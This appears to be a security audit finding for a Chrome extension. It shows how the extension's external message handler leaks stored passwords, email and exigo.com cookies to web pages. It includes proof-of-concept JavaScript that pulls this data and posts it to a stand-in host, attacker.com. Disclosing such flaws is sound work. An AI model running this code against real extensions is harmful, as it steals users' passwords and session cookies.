# CoCo Analysis: lkipohlhmnckldkanglmeinoalkmnigp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 16 (related to 2 distinct vulnerabilities)

---

## Sink 1-6: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lkipohlhmnckldkanglmeinoalkmnigp/opgen_generated_files/bg.js
Line 727-728: var storage_sync_get_source = {'key': 'value'};

**Code:**

```javascript
// Background script - bg.js (lines 965-1032)
function onRequest(request, sender, response) { // ← external message handler
    switch (request.type) {
        case 'updatePwd':
            obj = {}
            key = request.values.key.toLowerCase();
            var timeZoneOffsetInMS = new Date().getTimezoneOffset()*60*1000;
            obj[key] = {
              "ln":request.values.value.ln,
              "pw":request.values.value.pw, // ← password stored
              "date": new Date(new Date().getTime() - timeZoneOffsetInMS).toJSON().slice(0,10),
              "uid":request.values.value.uid,
               "cn":request.values.value.cn,
               "env":request.values.value.env
             };
            chrome.storage.sync.set(obj);
            response("ok")
            break;
        case 'getPwd':
            chrome.storage.sync.get(request.values.key.toLowerCase(), (data) => {
                response(data); // ← passwords sent to external caller
            });
            break;
        case 'email':
            chrome.storage.sync.get("email", (data) => {
                response(data); // ← email sent to external caller
            });
            break;
        case 'autoAddCreds':
            chrome.storage.sync.get("autoAddCreds", (data) => {
                response(data); // ← credentials setting sent to external caller
            });
            break;
        // ... other cases
    }
}

chrome.runtime.onMessageExternal.addListener(onRequest); // ← registered external handler
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Manifest externally_connectable:**
```json
"externally_connectable": {
	"matches": ["https://*.exigo.com/*"]
}
```

**Permissions:**
```json
"permissions": ["storage", "tabs", "cookies"]
```

**Attack:**

```javascript
// From any page on *.exigo.com domain
// Attacker can steal stored passwords
chrome.runtime.sendMessage('lkipohlhmnckldkanglmeinoalkmnigp', {
	type: 'getPwd',
	values: {
		key: 'some-account-key'
	}
}, function(data) {
	console.log('Stolen password data:', data);
	// data contains: {ln, pw, date, uid, cn, env}

	// Exfiltrate to attacker
	fetch('https://attacker.com/steal', {
		method: 'POST',
		body: JSON.stringify(data)
	});
});

// Steal email
chrome.runtime.sendMessage('lkipohlhmnckldkanglmeinoalkmnigp', {
	type: 'email'
}, function(data) {
	console.log('Stolen email:', data);
});

// Get auto-credentials settings
chrome.runtime.sendMessage('lkipohlhmnckldkanglmeinoalkmnigp', {
	type: 'autoAddCreds'
}, function(data) {
	console.log('Auto-creds setting:', data);
});
```

**Impact:** Critical information disclosure - passwords and credentials exfiltration. An attacker controlling content on exigo.com domain can retrieve all passwords stored by the extension including login names, passwords, user IDs, company names, and environment settings. This is a complete compromise of the password management functionality.

---

## Sink 7-16: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lkipohlhmnckldkanglmeinoalkmnigp/opgen_generated_files/bg.js
Lines 684-697: Cookie object properties flowing to sendResponseExternal

**Code:**

```javascript
// Background script - bg.js (lines 1003-1012)
function onRequest(request, sender, response) {
    switch (request.type) {
        case 'getCookies':
          chrome.cookies.getAll({"domain":".exigo.com"}, cookies => {
              console.log(cookies);
              response(cookies) // ← all .exigo.com cookies sent to external caller
          });
          break;
        // ... other cases
    }
}

chrome.runtime.onMessageExternal.addListener(onRequest);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Attack:**

```javascript
// From any page on *.exigo.com domain
// Attacker can steal all exigo.com cookies (including session cookies)
chrome.runtime.sendMessage('lkipohlhmnckldkanglmeinoalkmnigp', {
	type: 'getCookies'
}, function(cookies) {
	console.log('Stolen cookies:', cookies);
	// cookies array contains all cookie data including:
	// domain, name, value, path, secure, httpOnly, session, expirationDate, etc.

	// Exfiltrate session cookies to attacker
	fetch('https://attacker.com/steal-cookies', {
		method: 'POST',
		body: JSON.stringify({
			victim_cookies: cookies
		})
	});

	// Attacker can now hijack user sessions
});
```

**Impact:** Critical information disclosure - session hijacking. An attacker controlling content on exigo.com domain can retrieve all cookies for .exigo.com domain, including authentication session cookies. This enables complete session hijacking, allowing the attacker to impersonate the victim user on exigo.com without needing credentials. Combined with the password disclosure vulnerability above, this extension provides multiple paths for complete account compromise.
